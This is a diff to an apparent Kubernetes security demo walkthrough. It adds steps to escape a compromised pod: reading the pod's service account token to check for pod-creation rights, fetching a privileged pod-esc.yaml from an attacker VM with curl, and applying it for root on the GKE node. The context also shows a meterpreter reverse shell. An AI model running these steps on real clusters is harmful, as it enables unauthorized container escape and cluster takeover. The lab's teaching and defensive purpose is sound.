@@ -362,6 +362,8 @@ Now you have a reverse meterpreter session from the container, to get a shell ty
 
 ```bash
 meterpreter > shell
+```
+```
 Process 321 created.
 Channel 1 created.
 id
@@ -374,6 +376,8 @@ You have a shell and are the `www-data` user.
 
 ```bash
 kubectl get nodes
+```
+```
 NAME                                                  STATUS   ROLES    AGE     VERSION
 gke-lunalectric-gke--lunalectric-pool-061496f8-0460   Ready    <none>   3h43m   v1.23.16-gke.1400
 gke-lunalectric-gke--lunalectric-pool-6831ec86-jks2   Ready    <none>   3h44m   v1.23.16-gke.1400
@@ -381,8 +385,48 @@ gke-lunalectric-gke--lunalectric-pool-69fd8667-flj4   Ready    <none>   3h44m   
 
 ```
 
-## More Priv-Esc from node (google compute instance)
+## Escaping the pod and get a shell on the node (google compute instance)
 
+**Get the `kubectl` binary**
+
+```
+export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.24.12/bin/linux/amd64/kubectl; chmod 555 kubectl
+```
+
+**Find out the node IP via the `/etc/resolv.conf`**
+```bash
+cat /etc/resolv.conf
+```
+```
+search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.manuel-development-3.internal c.manuel-development-3.internal google.internal
+nameserver 10.228.0.10 #                 <----This is the line we need
+options ndots:5
+```
+
+The local node for the nameserver `10.228.0.10` is always the `x.x.x.1` address, so in that case `10.228.0.1`
+
+---
+
+**Now you can query the Node API if the service account on the pod has sufficient permissions to create a pod**
+
+```bash
+kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/ auth can-i create pods
+```
+```
+yes
+```
+
+### Deploy a pod that will get you a `root` account on the node
+
+**Download the `pod-esc.yaml` from the attacker VM**
+```bash
+curl -vk http://<attacker_vm_public_ip>8001/pod-esc.yaml -o /tmp/pod-esc.yaml
+```
+
+**Create the pod on the cluster**
+```bash
+kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  apply -f /tmp/pod-esc.yaml
+```
 
 ## Mondoo scan commands
 
